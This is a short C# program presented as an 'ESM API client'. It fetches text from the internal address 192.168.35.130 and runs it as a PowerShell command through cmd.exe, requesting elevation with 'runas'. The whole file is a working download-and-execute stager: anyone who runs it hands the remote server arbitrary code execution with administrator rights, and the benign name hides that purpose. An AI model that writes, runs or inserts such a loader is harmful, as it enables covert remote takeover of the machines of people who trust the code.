using System;
using System.IO;
using System.Net;
using System.Management;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Web;
using System.Net.Mime;
using System.Text;

namespace ESM_API_CLIENT
{
    public class ESM_API_CLIENT
    {
        public static void Main()
        {
            HttpWebRequest RequestClient = (HttpWebRequest)HttpWebRequest.Create(
                    requestUriString: "http://192.168.35.130"
                );
            RequestClient.ContentType = "application/json";
            var ResponseSR = RequestClient.GetResponse();
            string ResponseText;

            using (var sr = new StreamReader(ResponseSR.GetResponseStream()))
            {
                ResponseText = sr.ReadToEnd();
            }

            ResponseSR.Close();

            Process MyProcess = new Process();
            MyProcess.OutputDataReceived += MyProcess_OutputDataReceived;
            MyProcess.StartInfo = new ProcessStartInfo("cmd.exe")
            {
                WindowStyle = ProcessWindowStyle.Maximized,
                Verb = "runas",
                Arguments = $"/c powershell.exe -Command \"& {{{ResponseText}}}\""
            };
            MyProcess.Start();
            
        }

        private static void MyProcess_OutputDataReceived(object sender, DataReceivedEventArgs e)
        {
            Console.WriteLine(e.Data.ToString());
        }
    }
}